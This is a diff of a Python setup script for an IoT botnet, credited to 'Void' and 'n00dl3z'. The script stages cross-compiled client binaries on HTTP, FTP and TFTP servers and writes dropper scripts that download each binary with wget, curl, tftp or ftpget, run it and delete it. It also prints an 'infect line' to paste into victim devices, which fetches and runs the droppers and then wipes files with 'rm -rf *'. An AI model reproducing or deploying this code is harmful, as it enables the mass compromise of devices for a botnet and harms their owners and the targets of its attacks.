@@ -114,18 +114,22 @@ for arch in rust_archs:
     run(f"cp {binary_path} /var/ftp/{binary_name}")
     run(f"mv {binary_path} /var/lib/tftpboot/{binary_name}")
 
-# Creating shell scripts for binary execution
-bins_sh = f'''#!/bin/bash
-for binary in {" ".join([f"client-{arch}" for arch in rust_archs])}; do
-    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/$binary; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/www/html/bins.sh
-    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp {ip} -c get $binary; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/lib/tftpboot/tftp1.sh
-    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r $binary -g {ip}; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/lib/tftpboot/tftp2.sh
-    echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {ip} $binary $binary; chmod 777 $binary; ./$binary; rm -rf $binary" >> /var/ftp/ftp1.sh
-done
-'''
 
-with open("/var/www/html/bins.sh", "w") as f:
-    f.write(bins_sh)
+run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
+run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
+run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
+run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
+run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
+run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
+run('echo -e "#!/bin/bash" > /var/www/html/bins.sh')
+
+for arch in rust_archs:
+    i = "client-" + arch
+    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
+    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
+    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
+    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
+
 run("chmod +x /var/www/html/bins.sh")
 
 # Setup tftp1.sh, tftp2.sh, and ftp1.sh
@@ -139,6 +143,6 @@ run("service httpd restart")
 run('echo "ulimit -n 99999" >> ~/.bashrc')
 
 print("\x1b[0;32mSuccessfully cross compiled and set up servers!\x1b[0m")
-print("\x1b[0;32mYour Infect Line: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
+print("\x1b[0;32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; curl -O http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
 print()
 print("\x1b[0;32mCoded by Void. Modified by n00dl3z.\x1b[0m")
